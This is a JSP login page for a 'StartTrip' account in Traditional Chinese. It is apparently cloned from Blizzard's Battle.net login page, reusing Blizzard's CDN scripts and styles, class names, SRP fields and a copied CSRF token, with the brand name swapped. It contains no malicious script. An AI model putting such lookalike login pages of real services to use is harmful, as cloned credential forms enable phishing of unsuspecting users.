<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-tw"
	class="zh-tw blizzard">
<head xmlns:og="http://ogp.me/ns#" xmlns:fb="http://ogp.me/ns/fb#">
<meta http-equiv="imagetoolbar" content="false" />
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<title>StartTrip帳號登入</title>
<link rel="shortcut icon"
	href="" />
<!--[if gt IE 8]><!-->
<link rel="stylesheet" type="text/css" media="all"
	href="//bnetus-a.akamaihd.net/login/static/css/toolkit/blizzard-web.min.0RPhe.css" />
<!-- <![endif]-->
<!--[if IE 8]><link rel="stylesheet" type="text/css" media="all" href="/login/static/css/toolkit/blizzard-web-ie8.min.css?v=58-1" /><![endif]-->
<link rel="stylesheet" type="text/css" media="all"
	href="//bnetus-a.akamaihd.net/login/static/css/login/global.min.49VK4.css?v=1" />
<link rel="stylesheet" type="text/css" media="all"
	href="//bnetus-a.akamaihd.net/login/static/css/nav-client/nav-client.01xWv.css" />
<link rel="stylesheet" type="text/css" media="(max-width:800px)"
	href="//bnetus-a.akamaihd.net/login/static/css/nav-client/nav-client-responsive.0R6NA.css" />
<!--[if IE 8]>
<link rel="stylesheet" type="text/css" media="all" href="//bnetus-a.akamaihd.net/login/static/css/login/ie8.1GXdy.css" />
<![endif]-->
<link rel="search" type="application/opensearchdescription+xml"
	href="http://us.battle.net/zh-tw/data/opensearch" title="暴雪搜尋" />
<script type="text/javascript"
	src="//bnetus-a.akamaihd.net/login/static/js/toolkit/third-party/jquery/jquery-1.11.0.min.1UgDG.js?v=58-1"></script>
<script type="text/javascript"
	src="//bnetus-a.akamaihd.net/login/static/js/toolkit/toolkit.min.3Crdu.js?v=58-1"></script>
<script type="text/javascript"
	src="//bnetus-a.akamaihd.net/login/static/js/core.min.26Ucq.js?v=58-1"></script>
<meta name="viewport" content="width=device-width" />
</head>
<body style="background-color:gray"background="img/img1.jpg">
	<script type="text/javascript"
		src="//bnetus-a.akamaihd.net/login/static/js/login/analytics.min.1HAsh.js?v=58-1"></script>
	<div class="grid-container wrapper">
		<h1 >StartTrip帳號登入</h1>
		<div class="hide" id="info-wrapper">
			<h2>
				<strong class="info-title"></strong>
			</h2>
			<p class="info-body"></p>
			<button class="btn btn-block hide visible-phone"
				id="info-phone-close">Close</button>
		</div>
		<div class="input" id="login-wrapper">
			<div class="login">
				<form action="" method="post" id="password-form"
					novalidate="novalidate" class="
username-required
input-focus">
					<div id="login-input-container" class="">
						<div id="js-errors" class="alert alert-error alert-icon hide">
							<p id="cookie-check" class="hide">瀏覽器的 cookie 已被停用，得重新啟用
								cookie 才能繼續。</p>
						</div>
						<noscript>
							<div id="javascript-disabled"
								class="alert alert-error alert-icon">你必須開啟 JavaScript
								才可使用此網站。</div>
						</noscript>
						<div class="control-group">
							<label id="accountName-label" class="control-label"
								for="accountName">帳號（請使用電子郵件登入）</label>
							<div class="controls">
								<input aria-labelledby="accountName-label" id="accountName"
									name="accountName" title="帳號（請使用電子郵件登入）" maxlength="320"
									type="text" tabindex="1" class="input-block input-large"
									placeholder="帳號（請使用電子郵件登入）" autocorrect="off"
									spellcheck="false" />
							</div>
						</div>
						<div class="control-group">
							<label id="password-label" class="control-label" for="password">密碼</label>
							<div class="controls">
								<input aria-labelledby="password-label" id="password"
									name="password" title="密碼" maxlength="16" type="password"
									tabindex="1" class="input-block input-large" autocomplete="off"
									placeholder="密碼" autocorrect="off" spellcheck="false"
									data-show-password-message="顯示" data-hide-password-message="隱藏" />
							</div>
						</div>
						<input type="hidden" id="useSrp" name="useSrp" value="false" /> <input
							type="hidden" id="publicA" name="publicA" value="" /> <input
							type="hidden" id="clientEvidenceM1" name="clientEvidenceM1"
							value="" />
						<div class="persistWrapper">
							<label id="persistLogin-label"
								class="checkbox-label css-label hide" for="persistLogin">
								<input aria-labelledby="persistLogin-label" id="persistLogin"
								name="persistLogin" type="checkbox" checked="checked"
								tabindex="1" /> <span class="input-checkbox"></span> 保持登入狀態
							</label>
						</div>
					</div>
					<div class="control-group submit ">
						<button type="submit" id="submit"
							class="btn btn-primary btn-large btn-block " data-loading-text=""
							tabindex="1">
							登入StartTrip帳號 <i class="spinner-battlenet"></i>
						</button>
					</div>
					<input type="hidden" id="csrftoken" name="csrftoken"
						value="21143de9-61e6-4d9f-bb3b-f78bda44bc96" /> <input
						type="hidden" id="sessionTimeout" name="sessionTimeout"
						value="1519656218673" />
				</form>
				<div class="thirdparty-line">
					<span>或</span>
				</div>
				<div class="control-group useResponse">
					<form method="post" action="/login/signin/facebook"
						id="facebookLogin" class="third-party-login" enctype="">
						<button id="facebook" class="btn btn-block btn-large"
							rel="external" tabindex="1">使用Facebook快速登入</button>
						<input type="hidden" name="scope"
							value="public_profile,email,user_friends" /> <input
							type="hidden" name="ref"
							value="" />
						<input type="hidden" name="app" value="oauth" /> <input
							type="hidden" name="scheme" value="" /> <input type="hidden"
							id="csrftoken" name="csrftoken"
							value="" />
					</form>
				</div>
				<ul id="help-links">
					<li><a rel="internal"
						href=""
						tabindex="1" id="signup"> 建立免費的StartTrip帳號 </a></li>
					<li><a rel="internal"
						href=""
						tabindex="1" id="loginSupport"> 無法登入？ </a></li>
				</ul>
			</div>
		</div>
		<footer id="footer" class="footer zh-tw">
			<div id="nav-client-footer" class="nav-client">
				<div
					class="mobileFooterEnabled footer-content footer-desktop grid-container">
					<div class="nav-section support-feedback">
						<div class="nav-left">
							<div id="nav-feedback"></div>
						</div>
					</div>
					<div class="nav-section">
						<div class="nav-left nav-logo-group">
							<div class="footer-links nav-left">
								<a class="nav-item nav-a"
									href=""
									data-analytics="global-nav"
									data-analytics-placement="Footer - eula">StartTrip®
									最終用戶授權協議</a> <span>|</span> <a class="nav-item nav-a"
									href=""
									data-analytics="global-nav"
									data-analytics-placement="Footer - Privacy">隱私</a> <span>|</span>
								<a class="nav-item nav-a"
									href=""
									data-analytics="global-nav"
									data-analytics-placement="Footer - Terms">條款</a> <span>|</span>
								<a class="nav-item nav-a"
									href=""
									data-analytics="global-nav"
									data-analytics-placement="Footer - copyright">違反版權</a>
								<div class="copyright">©2018 StartTrip有限公司（StartTrip, Inc.）版權所有。</div>
								<div class="nav-footer-icon-container">
									<ul class="nav-footer-icon-list">
									</ul>
								</div>
							</div>
						</div>
						<div class="nav-ratings"></div>
					</div>
				</div>
				<div
					class="mobileFooterEnabled footer-content footer-mobile grid-container">
					<div class="nav-logo-group">
						<div class="footer-links">
							<a class="nav-item nav-a"
								href=""
								data-analytics="global-nav"
								data-analytics-placement="Footer - eula">StartTrip®
								最終用戶授權協議</a> <span>|</span> <a class="nav-item nav-a"
								href=""
								data-analytics="global-nav"
								data-analytics-placement="Footer - Privacy">隱私</a> <span>|</span>
							<a class="nav-item nav-a"
								href=""
								data-analytics="global-nav"
								data-analytics-placement="Footer - Terms">條款</a> <span>|</span>
							<a class="nav-item nav-a"
								href=""
								data-analytics="global-nav"
								data-analytics-placement="Footer - copyright">違反版權</a>
						</div>
						<div class="copyright">©2018 StartTrip股份有限公司（StartTrip, Inc.）版權所有。</div>
						<div class="nav-footer-icon-container">
							<ul class="nav-footer-icon-list">
							</ul>
						</div>
						<div class="nav-ratings"></div>
					</div>
				</div>
			</div>
		</footer>
	</div>
	<script type="text/javascript"
		src="//bnetus-a.akamaihd.net/login/static/js/embedded-javascript/embed-0.1.5.min.2QnZN.js?v=58-1"></script>
	<script type="text/javascript"
		src="//bnetus-a.akamaihd.net/login/static/js/login/global.min.3LqgD.js"></script>
	<script type="text/javascript"
		src="//bnetus-a.akamaihd.net/login/static/js/login/login.min.2CvPI.js"></script>
	<script type="text/javascript"
		src="//bnetus-a.akamaihd.net/login/static/js/login/srp-client.min.2bRvA.js?v=1"></script>
</body>
</html>